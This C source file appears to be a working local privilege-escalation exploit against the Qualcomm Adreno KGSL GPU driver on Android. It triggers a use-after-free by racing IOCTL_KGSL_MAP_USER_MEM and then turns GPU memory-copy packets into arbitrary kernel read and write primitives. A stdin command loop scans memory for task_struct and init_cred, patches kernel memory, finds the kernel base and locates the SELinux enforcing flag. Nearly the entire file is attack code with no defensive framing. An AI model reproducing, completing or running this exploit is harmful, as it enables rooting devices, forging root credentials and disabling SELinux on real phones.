#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <errno.h>

#ifndef __user
#define __user
#endif

#include "../../msm_kgsl.h"

#define PAGE_SIZE 4096
// IMPORTANT: These flags MUST match v6.c exactly
// KGSL_CONTEXT_PREAMBLE = 0x10, KGSL_CONTEXT_NO_GMEM_ALLOC = 0x02
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CMDLIST_IB 0x00000001
#define KGSL_TIMESTAMP_RETIRED 0x00000002
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
{
    unsigned int p = 0;
    while (val) {
        p ^= (val & 1);
        val >>= 1;
    }
    return p ^ 1;
}

static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt)
{
    return (7u << 28) | ((cnt & 0x3FFFu) << 0) | (pm4_calc_odd_parity_bit(cnt) << 15) | ((opcode & 0x7Fu) << 16) | (pm4_calc_odd_parity_bit(opcode) << 23);
}

#define CP_MEM_TO_MEM 0x73

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi)
{
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

static int kgsl_fd = -1;
static uint32_t ctx_id = 0;
static uint64_t ib_gpu = 0, dst_gpu = 0;
static void *ib_vma = NULL, *dst_vma = NULL;
static uint32_t ib_id = 0, dst_id = 0;

void cleanup_kgsl() {
    if (ib_vma && ib_vma != MAP_FAILED) munmap(ib_vma, PAGE_SIZE * 2);
    if (dst_vma && dst_vma != MAP_FAILED) munmap(dst_vma, PAGE_SIZE);
    
    struct kgsl_gpuobj_free fr = {0};
    if (ib_id) { fr.id = ib_id; ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
    if (dst_id) { fr.id = dst_id; ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
    
    if (ctx_id) {
        struct kgsl_drawctxt_destroy dctx = { .drawctxt_id = ctx_id };
        ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &dctx);
    }
    
    if (kgsl_fd >= 0) close(kgsl_fd);
    
    ctx_id = 0;
    ib_id = dst_id = 0;
    ib_vma = dst_vma = NULL;
    kgsl_fd = -1;
}

int init_kgsl() {
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        fprintf(stderr, "Error opening /dev/kgsl-3d0: %s\n", strerror(errno));
        return -1;
    }

    // Use the exact same flags and retry strategy as v6.c
    struct kgsl_drawctxt_create ctx = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
    };
    int retry = 30;
    while (retry--) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
            ctx_id = ctx.drawctxt_id;
            break;
        }
        // Small delay between retries (like v6.c, but faster)
        usleep(50000); // 50ms
    }
    
    if (ctx_id == 0) {
        fprintf(stderr, "IOCTL_KGSL_DRAWCTXT_CREATE failed: %s (flags: 0x%x)\n", 
                strerror(errno), ctx.flags);
        return -2;
    }

    struct kgsl_gpuobj_alloc alloc = { .size = PAGE_SIZE * 2, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) != 0) {
        fprintf(stderr, "IOCTL_KGSL_GPUOBJ_ALLOC (IB) failed: %s\n", strerror(errno));
        return -3;
    }
    ib_id = alloc.id;
    ib_vma = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)ib_id << 12);
    if (ib_vma == MAP_FAILED) {
        fprintf(stderr, "mmap IB failed: %s\n", strerror(errno));
        return -3;
    }
    
    struct kgsl_gpuobj_info info = { .id = ib_id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    alloc.size = PAGE_SIZE;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) != 0) {
        fprintf(stderr, "IOCTL_KGSL_GPUOBJ_ALLOC (DST) failed: %s\n", strerror(errno));
        return -4;
    }
    dst_id = alloc.id;
    dst_vma = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)dst_id << 12);
    if (dst_vma == MAP_FAILED) {
        fprintf(stderr, "mmap DST failed: %s\n", strerror(errno));
        return -4;
    }
    info.id = dst_id;
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    return 0;
}

int gpu_mem_op(uint64_t src_gpu_va, uint64_t dst_gpu_va, int size) {
    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;

    uint32_t d_lo, d_hi, s_lo, s_hi;
    split64(dst_gpu_va, &d_lo, &d_hi);
    split64(src_gpu_va, &s_lo, &s_hi);

    cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
    cmd[dw++] = 0;
    cmd[dw++] = d_lo;
    cmd[dw++] = d_hi;
    cmd[dw++] = s_lo;
    cmd[dw++] = s_hi;

    struct kgsl_command_object obj = { .gpuaddr = ib_gpu, .size = dw * 4, .flags = KGSL_CMDLIST_IB, .id = ib_id };
    struct kgsl_gpu_command gpu_cmd = {
        .cmdlist = (uintptr_t)&obj, .cmdsize = sizeof(obj), .numcmds = 1,
        .context_id = ctx_id
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0) return -1;
    
    struct kgsl_cmdstream_readtimestamp_ctxtid rt = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int spins = 0; spins < 10000; spins++) {
        ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &rt);
        if (rt.timestamp >= gpu_cmd.timestamp) break;
        usleep(100);
    }
    return 0;
}

int read_gpu_page(uint64_t src_gpu_va, uint8_t *out_buf) {
    if (gpu_mem_op(src_gpu_va, dst_gpu, PAGE_SIZE) != 0) return -1;
    memcpy(out_buf, dst_vma, PAGE_SIZE);
    return 0;
}

int write_gpu_mem(uint64_t dst_gpu_va, uint8_t *src_buf, int size) {
    memcpy(dst_vma, src_buf, size);
    return gpu_mem_op(dst_gpu, dst_gpu_va, size);
}

#include <sys/wait.h>
#include <pthread.h>

#define UAF_START 0x7001FF000ULL
#define UAF_SIZE  0x10004000ULL
#define BOGUS_START 0x700204000ULL
#define WRAP_SIZE 0xFFFFFFFFFFEFD000ULL

typedef struct {
    int fd;
    volatile int ready;
} race_state_t;

static void *bogus_racer(void *arg) {
    race_state_t *rs = (race_state_t *)arg;
    while (!rs->ready);
    struct kgsl_map_user_mem req = {
        .fd = -1, .gpuaddr = 0, .len = (size_t)WRAP_SIZE, 
        .hostptr = (unsigned long)BOGUS_START, .memtype = 2, .flags = 0x10000000ULL
    };
    ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    return NULL;
}

int trigger_uaf() {
    fprintf(stderr, "[UAF] allocating GPU object (size=0x%lx)...\n", (unsigned long)UAF_SIZE);
    fflush(stderr);
    struct kgsl_gpuobj_alloc alloc = { .size = UAF_SIZE, .flags = 0x10000000ULL };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0) {
        fprintf(stderr, "[UAF] GPUOBJ_ALLOC failed: %s\n", strerror(errno));
        return -1;
    }
    uint32_t uaf_id = alloc.id;
    fprintf(stderr, "[UAF] id=%u, mmap 0x%lx...\n", uaf_id, (unsigned long)UAF_START);
    fflush(stderr);

    void *uaf_vma = mmap((void *)UAF_START, UAF_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_vma == MAP_FAILED) {
        fprintf(stderr, "[UAF] mmap failed: %s\n", strerror(errno));
        return -2;
    }
    fprintf(stderr, "[UAF] touching %lu pages (1 byte each, fast)...\n",
            (unsigned long)(UAF_SIZE / PAGE_SIZE));
    fflush(stderr);
    // Fast page-touch (1 byte per page) like v6.c — avoids 256MB memset
    for (size_t i = 0; i < UAF_SIZE; i += PAGE_SIZE) {
        ((volatile char *)uaf_vma)[i] = 1;
    }
    munmap(uaf_vma, UAF_SIZE);
    fprintf(stderr, "[UAF] unmapped, running race...\n");
    fflush(stderr);

    mmap((void *)BOGUS_START, 4096 * 3, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    race_state_t rs = { .fd = kgsl_fd, .ready = 0 };
    pthread_t thread;
    pthread_create(&thread, NULL, bogus_racer, &rs);
    rs.ready = 1;
    usleep(200);
    pthread_join(thread, NULL);

    struct kgsl_gpuobj_free fr = { .id = uaf_id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    fprintf(stderr, "[UAF] complete\n");
    fflush(stderr);
    return 0;
}

int main(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "--test-exists") == 0) {
        return 0;
    }
    if (init_kgsl() != 0) {
        fprintf(stderr, "GPU Init failed\n");
        cleanup_kgsl();
        return 1;
    }

    setvbuf(stdout, NULL, _IONBF, 0); // Disable buffering for real-time output

    char line[256];
    while (fgets(line, sizeof(line), stdin)) {
        if (strncmp(line, "exploit", 7) == 0) {
            if (trigger_uaf() == 0) {
                printf("UAF_READY\n");
            } else {
                printf("UAF_FAILED\n");
            }
        } else if (strncmp(line, "read ", 5) == 0) {
            uint64_t addr = strtoull(line + 5, NULL, 16);
            uint8_t buf[PAGE_SIZE];
            if (read_gpu_page(addr, buf) == 0) {
                printf("DATA:%lx:%d\n", (unsigned long)addr, PAGE_SIZE);
                fwrite(buf, 1, PAGE_SIZE, stdout);
                printf("\nDATA_END\n");
            } else {
                printf("READ_FAILED\n");
            }
        } else if (strncmp(line, "patch ", 6) == 0) {
            uint64_t addr;
            uint32_t val;
            sscanf(line + 6, "%lx %x", &addr, &val);
            if (write_gpu_mem(addr, (uint8_t *)&val, 4) == 0) {
                printf("PATCH_SUCCESS\n");
            } else {
                printf("PATCH_FAILED\n");
            }
        } else if (strncmp(line, "scan ", 5) == 0) {
            uint64_t start, end;
            sscanf(line + 5, "%lx %lx", &start, &end);
            uint8_t buf[PAGE_SIZE];
            uint64_t total = end - start;
            uint64_t scanned = 0;
            fprintf(stderr, "[SCAN] start=%lx end=%lx total=%lu pages\n",
                    (unsigned long)start, (unsigned long)end, (unsigned long)(total / PAGE_SIZE));
            fflush(stderr);
            // Scan with step 4 pages (SCAN_PAGE_STEP=4 from v6.c) for speed
            for (uint64_t va = start; va < end; va += PAGE_SIZE * 4) {
                if (read_gpu_page(va, buf) == 0) {
                    int found_sig = 0;
                    int found_off = -1;
                    // 1. task_struct comm = "KETO0422" (8 bytes) — full marker
                    void *p = memmem(buf, PAGE_SIZE, "KETO0422", 8);
                    if (p) { found_sig = 1; found_off = (int)((uint8_t*)p - buf); }
                    // 2. System app
                    if (!found_sig) {
                        p = memmem(buf, PAGE_SIZE, "com.android.", 11);
                        if (p) { found_sig = 2; found_off = (int)((uint8_t*)p - buf); }
                    }
                    // 3. Kernel ELF header (kernel base)
                    if (!found_sig) {
                        p = memmem(buf, PAGE_SIZE, "\x7f" "ELF", 4);
                        if (p) { found_sig = 3; found_off = (int)((uint8_t*)p - buf); }
                    }
                    // 4. init_cred string
                    if (!found_sig) {
                        p = memmem(buf, PAGE_SIZE, "init_cred", 9);
                        if (p) { found_sig = 4; found_off = (int)((uint8_t*)p - buf); }
                    }
                    // 5. cred pointer — kernel pointer (0xffffff...) at expected task_struct offsets
                    if (!found_sig) {
                        for (int off = 0x700; off < 0x800 && off < PAGE_SIZE - 8; off += 8) {
                            uint64_t v;
                            memcpy(&v, buf + off, 8);
                            // Kernel pointers on AArch64: 0xffffff80..0xffffffcf
                            // AND aligned to 8 bytes (cred/real_cred are pointer-aligned)
                            if ((v >> 32) >= 0xffffff80 && (v >> 40) <= 0xffffffcf) {
                                // Additional filter: must be non-null and not 0xffffffffffffffff
                                if (v != 0 && v != 0xffffffffffffffffULL) {
                                    // Check if comm area near 0x718 has a string (printable ASCII)
                                    if (off >= 0x60 && off < 0x780) {
                                        int printable = 1;
                                        for (int k = (int)(off - 0x718); k >= 0 && k < 16; k++) {
                                            uint8_t c = buf[k];
                                            if (c != 0 && (c < 0x20 || c > 0x7e)) {
                                                printable = 0;
                                                break;
                                            }
                                        }
                                        if (printable || (off - 0x718) < 16) {
                                            found_sig = 6;
                                            found_off = off;
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }

                    if (found_sig) {
                        printf("MATCH:%lx:%d:%d\n", (unsigned long)va, found_sig, found_off);
                        printf("DATA:%lx:%d\n", (unsigned long)va, PAGE_SIZE);
                        fwrite(buf, 1, PAGE_SIZE, stdout);
                        printf("\nDATA_END\n");
                    }
                }
                scanned += PAGE_SIZE * 4;
                if ((va / PAGE_SIZE) % 100 == 0) {
                    fprintf(stderr, "[SCAN] progress 0x%lx / 0x%lx (%lu%%)\n",
                            (unsigned long)scanned, (unsigned long)total,
                            (unsigned long)(100 * scanned / total));
                    fflush(stderr);
                    printf("PROGRESS:%lx:%lx\n", (unsigned long)scanned, (unsigned long)total);
                    fflush(stdout);
                    usleep(1000);
                }
            }
            fprintf(stderr, "[SCAN] done\n");
            fflush(stderr);
            printf("SCAN_DONE\n");
            fflush(stdout);
        } else if (strncmp(line, "cred ", 5) == 0) {
            // Strict init_cred verification: read and check structure
            uint64_t va;
            sscanf(line + 5, "%lx", &va);
            uint8_t p1[PAGE_SIZE], p2[PAGE_SIZE];
            int ok1 = (read_gpu_page(va, p1) == 0);
            usleep(2000);
            int ok2 = (read_gpu_page(va, p2) == 0);
            if (!ok1 || !ok2) {
                printf("CRED:READ_FAIL:%lx\n", (unsigned long)va);
            } else {
                // struct cred { atomic_t usage; kuid_t uid,gid,suid,sgid,euid,egid; ... }
                // Layout: u32 usage, u32 uid, u32 gid, u32 suid, u32 sgid, u32 euid, u32 egid
                uint32_t usage1, uid1, gid1, usage2, uid2, gid2;
                memcpy(&usage1, p1 + 0,  4);
                memcpy(&uid1,   p1 + 4,  4);
                memcpy(&gid1,   p1 + 8,  4);
                memcpy(&usage2, p2 + 0,  4);
                memcpy(&uid2,   p2 + 4,  4);
                memcpy(&gid2,   p2 + 8,  4);
                if (usage1 != usage2 || uid1 != uid2 || gid1 != gid2) {
                    printf("CRED:UNSTABLE:%lx:u=%u/%u id=%u/%u\n",
                           (unsigned long)va, usage1, usage2, uid1, uid2);
                } else if (uid1 == 0 && gid1 == 0 && usage1 > 0 && usage1 < 100) {
                    // Looks like root init_cred (uid=gid=0, low usage count)
                    printf("CRED:OK:%lx:usage=%u:uid=%u:gid=%u:root\n",
                           (unsigned long)va, usage1, uid1, gid1);
                } else if (uid1 == uid2 && gid1 == gid2) {
                    printf("CRED:OK:%lx:usage=%u:uid=%u:gid=%u\n",
                           (unsigned long)va, usage1, uid1, gid1);
                } else {
                    printf("CRED:FAIL:%lx\n", (unsigned long)va);
                }
            }
            fflush(stdout);
        } else if (strncmp(line, "selinux ", 8) == 0) {
            // Strict SELinux enforcing: 3 reads, must be stable 0/1, AND page
            // must have non-zero data (real .data/.bss page, not zero-filled)
            uint64_t va;
            sscanf(line + 8, "%lx", &va);
            uint8_t p1[PAGE_SIZE], p2[PAGE_SIZE], p3[PAGE_SIZE];
            int ok1 = (read_gpu_page(va, p1) == 0);
            usleep(2000);
            int ok2 = (read_gpu_page(va, p2) == 0);
            usleep(2000);
            int ok3 = (read_gpu_page(va, p3) == 0);
            if (!ok1 || !ok2 || !ok3) {
                printf("SELINUX:READ_FAIL:%lx\n", (unsigned long)va);
            } else {
                uint32_t v1, v2, v3;
                memcpy(&v1, p1, 4);
                memcpy(&v2, p2, 4);
                memcpy(&v3, p3, 4);
                if (v1 == v2 && v2 == v3 && (v1 == 0 || v1 == 1)) {
                    int nonzero = 0;
                    int has_pointer = 0;
                    for (int i = 0; i < PAGE_SIZE; i++) {
                        if (p1[i] != 0) nonzero++;
                    }
                    for (int i = 0; i < PAGE_SIZE - 8; i += 8) {
                        uint64_t kp;
                        memcpy(&kp, p1 + i, 8);
                        if ((kp >> 32) >= 0xffffff80 && (kp >> 40) <= 0xffffffcf && kp != 0) {
                            has_pointer = 1;
                            break;
                        }
                    }
                    if (nonzero < 32) {
                        // Page is mostly zero — not a real kernel data page
                        printf("SELINUX:ZERO_PAGE:%lx:val=%u:nonzero=%d\n",
                               (unsigned long)va, v1, nonzero);
                    } else if (nonzero < 128) {
                        printf("SELINUX:WEAK:%lx:val=%u:nonzero=%d:ptr=%d\n",
                               (unsigned long)va, v1, nonzero, has_pointer);
                    } else {
                        printf("SELINUX:OK:%lx:%u:stable:nz=%d:ptr=%d\n",
                               (unsigned long)va, v1, nonzero, has_pointer);
                    }
                } else if (v1 == v2 && v2 == v3) {
                    printf("SELINUX:UNSTABLE:%lx:%u:stable_not_01\n",
                           (unsigned long)va, v1);
                } else {
                    printf("SELINUX:FAIL:%lx:%u:%u:%u\n",
                           (unsigned long)va, v1, v2, v3);
                }
            }
            fflush(stdout);
        } else if (strncmp(line, "kbase", 5) == 0) {
            // Auto-find kernel base by trying known addresses
            uint64_t bases[] = {
                0xffffffc000000000ULL, 0xffffffc010000000ULL,
                0xffffffc020000000ULL, 0xffffffc030000000ULL,
                0xffffffc035000000ULL, 0xffffffc040000000ULL,
                0xffffffc008200000ULL, 0xffffffb000000000ULL,
                0xffffffa000000000ULL, 0xffffffaf00000000ULL,
                0xffffffaf20000000ULL, 0xffffff9550000000ULL,
                0xffffff94d0000000ULL, 0xffffff8e70000000ULL
            };
            uint8_t page[PAGE_SIZE];
            int found = 0;
            for (size_t i = 0; i < sizeof(bases) / sizeof(bases[0]); i++) {
                if (read_gpu_page(bases[i], page) == 0) {
                    if (page[0] == 0x7f && page[1] == 'E' &&
                        page[2] == 'L' && page[3] == 'F') {
                        printf("KBASE:%lx\n", (unsigned long)bases[i]);
                        fflush(stdout);
                        found = 1;
                        break;
                    }
                }
                // Check SELinux enforcing at known offset too
                uint32_t sel = 0;
                uint64_t sel_va = bases[i] + 0x02caa000ULL;
                if (read_gpu_page(sel_va, page) == 0) {
                    memcpy(&sel, page, 4);
                    if (sel <= 1) {
                        printf("KBASE:%lx\n", (unsigned long)bases[i]);
                        printf("SELINUX:%lx\n", (unsigned long)sel_va);
                        fflush(stdout);
                        found = 1;
                        break;
                    }
                }
            }
            if (!found) printf("KBASE_FAILED\n");
        } else if (strncmp(line, "quit", 4) == 0) {
            break;
        }
    }

    cleanup_kgsl();
    return 0;
}
